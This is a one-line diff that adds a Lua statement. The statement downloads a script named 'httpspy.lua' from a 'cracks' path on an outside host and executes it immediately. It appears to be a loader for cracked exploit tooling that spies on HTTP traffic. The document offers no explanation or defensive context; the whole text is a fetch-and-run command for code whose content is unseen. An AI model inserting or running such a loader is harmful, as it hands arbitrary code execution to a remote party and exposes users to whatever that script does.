@@ -1,0 +1,1 @@
+loadstring(request({Url = "https://seere.vip/cracks/httpspy.lua"}).Body)()
